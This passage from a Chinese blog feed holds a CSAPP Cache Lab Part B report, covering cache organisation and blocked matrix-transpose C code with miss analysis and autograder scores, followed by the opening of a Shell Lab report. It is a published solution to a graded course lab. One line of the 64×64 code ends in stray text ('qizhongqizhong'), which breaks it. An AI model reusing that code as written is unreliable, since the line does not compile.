<p>一个m位的地址L被组织为3个部分，分别是高t位的标记位，中间s位的组索引以及低b位的块偏移。</p>
<p>L中的s个组索引是一个到S个组的数组的索引，从0开始。其指示了该地址所指示的字应当存储到哪个组中。<br>L中的t个标记位指明了该组中的哪一行包含这个字。当且仅当有效位为1且行的标记位与地址的标记位相同时，组中的行才包含了这个字。<br>块偏移b指明了在B个字节的数据块中的字偏移。</p>
<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>根据每个组的高速缓存行数E，高速缓存被分为不同的类：</p>
<ul>
<li>直接映射高速缓存。直接映射高速缓存中每个组只有一行（E = 1）。</li>
<li>组相连高速缓存。组相连高速缓存放宽了直接映射高速缓存中每个组只有一行的限制（1 &lt; E &lt; C/B）。</li>
<li>全相连高速缓存。全相连高速缓存是由一个包含了所有高速缓存行的组（E = C/B）组成的。</li>
</ul>
<p>组相连高速缓存引入了不命中时行替换策略的问题。比较常见的策略有最不常使用（LFU）和最近最少使用（LRU）。</p>
<p>由于构造又大又快的相连高速缓存很困难，全相连高速缓存通常只适合做小的高速缓存，如TLB（翻译备用缓冲器）。</p>
<h5 id="高速缓存写"><a href="#高速缓存写" class="headerlink" title="高速缓存写"></a>高速缓存写</h5><p>高速缓存写分为直写和写回。</p>
<ul>
<li>直写，当缓存更新后立刻将相应的高速缓存块写回到下一层存储器中。直写的缺点在于每次写都会引起总线流量。</li>
<li>写回，尽可能地推迟更新，只有当替换算法需要驱逐更新过的块时，才执行写入操作。写回极大地降低了总线流量。但是高速缓存必须对于每一个高速缓存行维护一个额外的修改位（dirty bit）来表明这个高速缓存块是否会修改过。</li>
</ul>
<h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p>
<p>在该实验中，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p>
<ol>
<li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li>
<li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li>
</ol>
<p>为了解决第一个问题，我们需要仔细地考虑对于矩阵元素访问的顺序。至于第二个问题，我们采用矩阵的分块技术来降低不命中数。</p>
<blockquote>
<p>矩阵分块的目的在于将大的、不能完全加载进入缓存的大矩阵分块成小的、可以完全加载进入缓存的小矩阵块来处理。小矩阵块具有良好的局部性，性能显著增加。<br>但同时也要注意，分块使得程序的可阅读性大大降低，因此一般只在常用的库函数中采用分块优化。</p>
</blockquote>
<h4 id="第一部分-32-×-32矩阵优化"><a href="#第一部分-32-×-32矩阵优化" class="headerlink" title="第一部分 32 × 32矩阵优化"></a>第一部分 32 × 32矩阵优化</h4><p>第一部分满分的要求是300个misses以内，misses超过600则0分。</p>
<p>首先对矩阵进行分块处理。为了完全利用每一个缓存快（32个字节）采用8 × 8分块。然后处理对角线的问题。这里我采用的方法是无论是哪一个矩阵分块，均从该矩阵分块的对角线开始处理。同时对于A矩阵（原始矩阵）按列优先（不连续读），对于B矩阵（转置矩阵）按行优先（连续写）。</p>
<p>通过优先处理对角线(a, a)的元素，保证了B矩阵的第a行被载入缓存中，接下来对于A矩阵的列优先处理保证了B矩阵的第a行缓存被充分利用。</p>
<p>对于32 × 32的矩阵，总共存在1024次读和1024次写。对于非对角线的分块（总共12个），其缓存不命中率是1/8（仅强制不命中），对于对角线的分块（总共4个），其写的缓存不命中率是1/8（强制不命中），其读的缓存不命中率为1/4（强制不命中和冲突不命中各一半）。</p>
<p>因此，理论上优化之后的总缓存不命中数为2048 × 0.75 × 0.125 + 1024 × 0.25 × 0.125 + 1024 × 0.25 × 0.25 = 288次。</p>
<p>第一部分优化之后的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">8</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = b ; c &lt; b + <span class="number">8</span> ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = a + c - b ; d &gt;= a ; --d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (d = a + c - b + <span class="number">1</span> ; d &lt; a + <span class="number">8</span> ; ++d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数为287次，与理论值几乎一致。</p>
<h4 id="第二部分-64-×-64矩阵优化"><a href="#第二部分-64-×-64矩阵优化" class="headerlink" title="第二部分 64 × 64矩阵优化"></a>第二部分 64 × 64矩阵优化</h4><p>第二部分的满分要求是misses小于1300，当misses大于2000则零分。</p>
<p>第二部分对于misses的要求限制的非常严格，同时如果采用第一部分的8 × 8分块方式会出人意料地带来大量的misses。下面具体分析8 × 8分块导致misses增多的原因。</p>
<p>实验采用的缓存为直接映射高速缓存，s = 5， b = 5， E = 1。对于任意一个地址，其从低地址开始的第0-4位为块偏移b，第5-9为组索引s。</p>
<p>对于32 × 32的矩阵M来说，M[0][1]和M[1][1]之间总共间隔32个int型元素，也就是0x80个字节，也就是说，同一列相邻行的元素之间的地址间隔为0x80 = 0x100|00000。对于8 × 8的矩阵分块而言，其8行可以全部被加载进入缓存中而不发生任何冲突不命中。</p>
<p>然而，对于64 × 64的矩阵，其同一列相邻行的元素之间的地址间隔为0x100 = 0x1000|00000。对于8 × 8的矩阵分块而言，其第1、2、3、4行的元素会和第5、6、7、8行的元素占用相同的高速缓存组，进而出现严重的冲突不命中现象。</p>
<p>使用4 × 4的矩阵分块又无法充分利用每一个高速缓存行（32个字节=8个int数据），仍然无法达到所要求的misses数。</p>
<p>经过大量的尝试，我使用了以下的方法进行矩阵转置的优化：</p>
<p>仍然按照8 × 8对矩阵进行分块，只是在8 × 8的分块内部再按照4 × 4进一步分块，得到左上、右上、左下、右下4个子块。</p>
<p>紧接着依次按照左上、右上、右下、左下的方式处理4个子块（A矩阵）。<br>对于左上、右下这两个可能出现对角线元素的块，按照第一个矩阵优化的方式进行处理。<br>右上、左下子块不能简单地按照A矩阵不连续读，B矩阵连续写的方式处理。原因是对于对角线上的8 × 8分块来说，A、B矩阵的左上子块和右下子块占用了相同的高速缓存组，存在着严重的冲突不命中风险。<br>因此对于右上、左下的子块，我们按照下图的方式处理。</p>
<img src="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/matrix64-1" alt="matrix64-1" title="">
<p>图中，上方的矩阵为矩阵A，下方的矩阵为矩阵B，小方块代表矩阵的元素，黑色方块的表明加载进入临时变量/已写入的元素。红色的线表明该行被缓存。</p>
<ol>
<li>利用8个临时变量，将左上子块的前两行加载进入临时变量中，考虑到之前的缓存条件，该次加载的缓存命中。</li>
<li>将一个小的2×2的矩阵转置写入矩阵B右下子块的前两行，无论是否为对角线上的分块，该次写入一定会发生缓存不命中，同时将B矩阵的前两行载入高速缓存行。</li>
<li>将矩阵A左上子块的后两行的2×2的矩阵加载进入空闲的4个临时变量中，同之前加载相似，该次加载的缓存命中。</li>
<li>将刚刚加载的2×2矩阵转置写入B矩阵右下子块前两行的剩余位置，由于之前这两行已经加载进入了高速缓存行，故该次写入的缓存全部命中。</li>
<li>将矩阵A后两行的剩余元素加载进入空闲的4个临时变量中，缓存命中。</li>
<li>将8个临时变量中的元素依次转置写入矩阵B右下子块的最后两行中，同2相似，写入一定会发生缓存不命中，同时将矩阵B的后两行载入高速缓存行。</li>
</ol>
<p>A矩阵左下子块的转置操作类似，这里不再赘述。</p>
<p>在A矩阵右上子块转置完成后，紧接着执行的是右下子块的转置，此时，对于非对角线上的分块而言，写入时的缓存必定命中。对于对角线上的分块，则会发生缓存不命中。</p>
<p>因此，对于64 × 64的矩阵，总共进行4096次读和4096次写，对于非对角线的分块（总共56个），对于A矩阵（原始矩阵而言），其左上、右下分块的不命中率为1/4，左下、右上分块的不命中率为0；对于B矩阵（转置矩阵而言），其左上、右上、左下分块的不命中率均为1/4，右下分块的不命中率为0。对于对角线上的矩阵，其B矩阵不命中率上升至1/4，对于A矩阵，其左上、右下的不命中率上升至1/2。</p>
<p>因此，理论上优化之后的总缓存不命中数为4096 × (8/64) × (1/2 × 1/4 + 0 × 1/4 + 0 × 1/4 + 1/2 × 1/4) + 4096 × (8/64) × 1/4 + 4096 × (56/64) × (1/4 × 1/4 + 0 × 1/4 + 0 × 1/4 + 1/4 × 1/4) + 4096 × (56/64) × (1/4 × 1/4 + 1/4 × 1/4 + 0 × 1/4 + 1/4 × 1/4) = 1376次。</p>
<p>该优化方法对应的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; M ; a += <span class="number">8</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; N ; b += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = a ; c &lt; a + <span class="number">4</span> ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a ; d &gt;= b ; -- d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a + <span class="number">1</span>; d &lt; b + <span class="number">4</span> ; ++d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        tmp0 = A[b][a + <span class="number">4</span>];</div><div class="line">        tmp1 = A[b][a + <span class="number">5</span>];</div><div class="line">        tmp2 = A[b][a + <span class="number">6</span>];</div><div class="line">        tmp3 = A[b][a + <span class="number">7</span>];</div><div class="line">        tmp4 = A[b + <span class="number">1</span>][a + <span class="number">4</span>];</div><div class="line">        tmp5 = A[b + <span class="number">1</span>][a + <span class="number">5</span>];</div><div class="line">        tmp6 = A[b + <span class="number">1</span>][a + <span class="number">6</span>];</div><div class="line">        tmp7 = A[b + <span class="number">1</span>][a + <span class="number">7</span>];</div><div class="line">        B[a + <span class="number">4</span>][b] = tmp0;</div><div class="line">        B[a + <span class="number">4</span>][b + <span class="number">1</span>] = tmp4;</div><div class="line">        B[a + <span class="number">5</span>][b] = tmp1;</div><div class="line">        B[a + <span class="number">5</span>][b + <span class="number">1</span>] = tmp5;</div><div class="line">        tmp0 = A[b + <span class="number">2</span>][a + <span class="number">4</span>];</div><div class="line">        tmp4 = A[b + <span class="number">2</span>][a + <span class="number">5</span>];</div><div class="line">        tmp1 = A[b + <span class="number">3</span>][a + <span class="number">4</span>];</div><div class="line">        tmp5 = A[b + <span class="number">3</span>][a + <span class="number">5</span>];</div><div class="line">        B[a + <span class="number">4</span>][b + <span class="number">2</span>] = tmp0;</div><div class="line">        B[a + <span class="number">4</span>][b + <span class="number">3</span>] = tmp1;</div><div class="line">        B[a + <span class="number">5</span>][b + <span class="number">2</span>] = tmp4;</div><div class="line">        B[a + <span class="number">5</span>][b + <span class="number">3</span>] = tmp5;</div><div class="line">        tmp0 = A[b + <span class="number">2</span>][a + <span class="number">6</span>];</div><div class="line">        tmp4 = A[b + <span class="number">2</span>][a + <span class="number">7</span>];</div><div class="line">        tmp1 = A[b + <span class="number">3</span>][a + <span class="number">6</span>];</div><div class="line">        tmp5 = A[b + <span class="number">3</span>][a + <span class="number">7</span>];</div><div class="line">        B[a + <span class="number">6</span>][b] = tmp2;</div><div class="line">        B[a + <span class="number">6</span>][b + <span class="number">1</span>] = tmp6;</div><div class="line">        B[a + <span class="number">6</span>][b + <span class="number">2</span>] = tmp0;</div><div class="line">        B[a + <span class="number">6</span>][b + <span class="number">3</span>] = tmp1;</div><div class="line">        B[a + <span class="number">7</span>][b] = tmp3;</div><div class="line">        B[a + <span class="number">7</span>][b + <span class="number">1</span>] = tmp7;</div><div class="line">        B[a + <span class="number">7</span>][b + <span class="number">2</span>] = tmp4;</div><div class="line">        B[a + <span class="number">7</span>][b + <span class="number">3</span>] = tmp5;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (c = a + <span class="number">4</span>; c &lt; a + <span class="number">8</span> ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a ; d &gt;= b + <span class="number">4</span> ; --d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a + <span class="number">1</span> ; d &lt; b + <span class="number">8</span> ; ++d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        tmp0 = A[b + <span class="number">6</span>][a];</div><div class="line">        tmp1 = A[b + <span class="number">6</span>][a + <span class="number">1</span>];</div><div class="line">        tmp2 = A[b + <span class="number">6</span>][a + <span class="number">2</span>];</div><div class="line">        tmp3 = A[b + <span class="number">6</span>][a + <span class="number">3</span>];</div><div class="line">        tmp4 = A[b + <span class="number">7</span>][a];</div><div class="line">        tmp5 = A[b + <span class="number">7</span>][a + <span class="number">1</span>];</div><div class="line">        tmp6 = A[b + <span class="number">7</span>][a + <span class="number">2</span>];</div><div class="line">        tmp7 = A[b + <span class="number">7</span>][a + <span class="number">3</span>];</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">6</span>] = tmp2;</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">7</span>] = tmp6;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">6</span>] = tmp3;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">7</span>] = tmp7;</div><div class="line">        tmp2 = A[b + <span class="number">4</span>][a + <span class="number">2</span>];</div><div class="line">        tmp3 = A[b + <span class="number">4</span>][a + <span class="number">3</span>];</div><div class="line">        tmp6 = A[b + <span class="number">5</span>][a + <span class="number">2</span>];</div><div class="line">        tmp7 = A[b + <span class="number">5</span>][a + <span class="number">3</span>];</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">4</span>] = tmp2;</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">5</span>] = tmp6;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">4</span>] = tmp3;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">5</span>] = tmp7;</div><div class="line">        tmp2 = A[b + <span class="number">4</span>][a];</div><div class="line">        tmp3 = A[b + <span class="number">4</span>][a + <span class="number">1</span>];</div><div class="line">        tmp6 = A[b + <span class="number">5</span>][a];</div><div class="line">        tmp7 = A[b + <span class="number">5</span>][a + <span class="number">1</span>];</div><div class="line">        B[a][b + <span class="number">4</span>] = tmp2;</div><div class="line">        B[a][b + <span class="number">5</span>] = tmp6;</div><div class="line">        B[a][b + <span class="number">6</span>] = tmp0;qizhongqizhong</div><div class="line">        B[a][b + <span class="number">7</span>] = tmp4;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">4</span>] = tmp3;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">5</span>] = tmp7;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">6</span>] = tmp1;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">7</span>] = tmp5;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1379次。</p>
<p>到了这里我已经优化到了极限，但是依然没有达到满分，最后参考了网上的满分答案。<br>这里要注意到，实验讲义中说的很清楚，不允许修改矩阵A，但是矩阵B可以任意修改。因此，我们可以通过在矩阵B中暂存转置的结果来充分利用缓存，进一步降低缓存不命中数。思路如下图。</p>
<img src="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/matrix64-2" alt="matrix64-2" title="">
<ol>
<li>按行加载矩阵A，并且将其存入矩阵B。依次执行4次，直到整个分块的上半部分处理完毕。其中，每行的前4个元素被正确转置，后四个元素被暂存至矩阵B的右上分块。</li>
<li>对于分块的下半部分的第一行，先将矩阵B的右上分块的4个元素载入至临时变量，然后从矩阵A中的左下分块读取第一列并转置进入矩阵右上分块的第一行，然后将读出的4个元素存入矩阵B右下分块的第一行，最后再将矩阵A右下分块第一列转置送入矩阵B右下分块的第一行。</li>
<li>按照2的方式依次处理完下半部分的所有行。</li>
</ol>
<p>对于一个8×8的分块而言，过程1处理了分块的上半部分，共执行了32次读和32次写。对于对角线上的分块，其读不命中率为1/8，写不命中率为1/4；对于非对角线上的分块，其读不命中率为1/8，写不命中率为1/8。过程2和3处理了分块的下半部分包括将矩阵B的右上子块移动到正确位置，将矩阵A的左下子块转置到B的右上子块以及矩阵A右下子块的转置，共执行了48次读和48次写。对于对角线上的分块，其读不命中率为1/3，写不命中率为1/4；对于非对角线上的分块，其读不命中率为1/12，写不命中率为1/12。</p>
<p>因此对于56个非对角线分块以及8个对角线分块，理论上优化后的总缓存不命中数为(32 × 1/8 + 32 × 1/8) × 56 + (32 × 1/8 + 32 × 1/4) × 8 + (48 × 1/12 + 48 × 1/12) × 56 + (48 × 1/3 + 48 × 1/4) × 8 = 1216次。</p>
<p>该优化方法的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">8</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = b ; c &lt; b + <span class="number">4</span> ; ++c) &#123;</div><div class="line">            tmp0 = A[c][a];</div><div class="line">            tmp1 = A[c][a + <span class="number">1</span>];</div><div class="line">            tmp2 = A[c][a + <span class="number">2</span>];</div><div class="line">            tmp3 = A[c][a + <span class="number">3</span>];</div><div class="line">            tmp4 = A[c][a + <span class="number">4</span>];</div><div class="line">            tmp5 = A[c][a + <span class="number">5</span>];</div><div class="line">            tmp6 = A[c][a + <span class="number">6</span>];</div><div class="line">            tmp7 = A[c][a + <span class="number">7</span>];</div><div class="line">            B[a][c] = tmp0;</div><div class="line">            B[a + <span class="number">1</span>][c] = tmp1;</div><div class="line">            B[a + <span class="number">2</span>][c] = tmp2;</div><div class="line">            B[a + <span class="number">3</span>][c] = tmp3;</div><div class="line">            B[a][c + <span class="number">4</span>] = tmp4;</div><div class="line">            B[a + <span class="number">1</span>][c + <span class="number">4</span>] = tmp5;</div><div class="line">            B[a + <span class="number">2</span>][c + <span class="number">4</span>] = tmp6;</div><div class="line">            B[a + <span class="number">3</span>][c + <span class="number">4</span>] = tmp7;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (c = a + <span class="number">4</span> ; c &lt; a + <span class="number">8</span> ; ++c) &#123;</div><div class="line">            tmp0 = B[c - <span class="number">4</span>][b + <span class="number">4</span>];</div><div class="line">            tmp1 = B[c - <span class="number">4</span>][b + <span class="number">5</span>];</div><div class="line">            tmp2 = B[c - <span class="number">4</span>][b + <span class="number">6</span>];</div><div class="line">            tmp3 = B[c - <span class="number">4</span>][b + <span class="number">7</span>];</div><div class="line"></div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">4</span>] = A[b + <span class="number">4</span>][c - <span class="number">4</span>];</div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">5</span>] = A[b + <span class="number">5</span>][c - <span class="number">4</span>];</div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">6</span>] = A[b + <span class="number">6</span>][c - <span class="number">4</span>];</div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">7</span>] = A[b + <span class="number">7</span>][c - <span class="number">4</span>];</div><div class="line"></div><div class="line">            B[c][b] = tmp0;</div><div class="line">            B[c][b + <span class="number">1</span>] = tmp1;</div><div class="line">            B[c][b + <span class="number">2</span>] = tmp2;</div><div class="line">            B[c][b + <span class="number">3</span>] = tmp3;</div><div class="line"></div><div class="line">            B[c][b + <span class="number">4</span>] = A[b + <span class="number">4</span>][c];</div><div class="line">            B[c][b + <span class="number">5</span>] = A[b + <span class="number">5</span>][c];</div><div class="line">            B[c][b + <span class="number">6</span>] = A[b + <span class="number">6</span>][c];</div><div class="line">            B[c][b + <span class="number">7</span>] = A[b + <span class="number">7</span>][c];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1219次。</p>
<h4 id="第三部分-61-×-67矩阵优化"><a href="#第三部分-61-×-67矩阵优化" class="headerlink" title="第三部分 61 × 67矩阵优化"></a>第三部分 61 × 67矩阵优化</h4><p>由于61 × 67的矩阵不是方阵，不方便定量分析。同时限制放的比较宽松，满分misses小于2000，misses大于3000零分。因此无需考虑处理对角线，仅尝试换用不同的边长分块即可。16 × 16的分块已可以保证满分。</p>
<p>第三部分优化之后的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">16</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">16</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = b ; (c &lt; b + <span class="number">16</span>) &amp;&amp; (c &lt; M) ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = a ; (d &lt; a + <span class="number">16</span>) &amp;&amp; (d &lt; N) ; ++d) &#123;</div><div class="line">                    B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1847次。</p>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>自动评分脚本给出的输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Cache Lab summary:</div><div class="line">                        Points   Max pts      Misses</div><div class="line">Csim correctness          27.0        27</div><div class="line">Trans perf 32x32           8.0         8         287</div><div class="line">Trans perf 64x64           8.0         8        1219</div><div class="line">Trans perf 61x67          10.0        10        1847</div><div class="line">          Total points    53.0        53</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>这次实验花费了我很久时间，最后还是参考了网上的解法并且花了很大精力去理解，实验给出的缓存条件非常苛刻，但同时也方便了定量分析。完成后确实大大加深了我对于缓存的理解。</p>
<p>这次实验中我认为比较重要/难的地方：一是对于缓存的理解以及矩阵元素在缓存中的排布问题；二是位于对角线上的分块不仅是内部而且在分块间存在的冲突不命中问题；三是虽然是矩阵，但是也要明确统一控制行列的变量。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;上&lt;/p&gt;
&lt;blockqu
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统ShellLab实验报告</title>
    <link href="http://blog.codedragon.tech/2017/08/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FShellLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/08/01/深入理解计算机系统ShellLab实验报告/</id>
    <published>2017-08-01T07:27:04.000Z</published>
    <updated>2017-10-09T06:03:43.297Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/ShellLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>这一个月一来一直在看《深入理解计算机系统》的后几章，终于全部看完了（除了第4章：处理器体系结构外）。然后开始集中处理实验，以下是Shell Lab的实验解答。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Shell Lab - Writing Your Own Unix Shell主要是有关于进程、信号以及异常处理的实验，对应于书本的第8章：异常控制流。主要通过实现一个带作业控制的Unix Shell来熟悉进程以及信号的概念。</p>
<p>本实验已经给出了Tiny Shell的源程序的基本框架(tsh.c)，你需要做的是填充该框架中的eval builtin_cmd do_bgfg waitfg sigchld_handler sigint_handler sigtstp_handler等函数。使得编译后的Shell具有相应的功能。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/shlab.pdf" target="_blank" rel="external">实验讲义</a></p>
<h2 id="Shell介绍"><a href="#Shell介绍" class="headerlink" title="Shell介绍"></a>Shell介绍</h2><p>Shell是一个代表用户运行程序的命令行解释器。一个Shell周期性的打印一个提示符，从标准输入流等待一条命令行输入，然后根据命令行的输入执行相应的功能。</p>
<p>一条命令行输入是由空格分隔ASCII文本词(words)。命令行输入的第一个词要不然是一个内建命令(built-in command)要不然是一个可执行文件的路径。剩余的词是命令行参数。如果第一个词是内建命令，Shell立刻在当前进程中执行该命令。否则，词会被假设为一个可执行程序的路径。在这种情况下，Shell会fork出一个子进程，在子进程的上下文中加载并运行这个程序。被创建的子进程被称作任务(job)。总的来说，一个任务可以包含通过Unix管道(Unix Pipe)连接的多个子进程。</p>
<p>如果命令行输入以<code>&#39;&amp;&#39;</code>结尾，那么这个任务将会在后台执行，这意味着Shell在打印下一个提示符并等待下一条命令行输入之前不会等待当前任务终止。在默认情况下，任务运行在前台，这意味这Shell在下一条命令行输入之前会等待当前任务终止。在任何的情况下， 只能有一个任务运行在前台，但是，可以有多个任务运行在后台。</p>
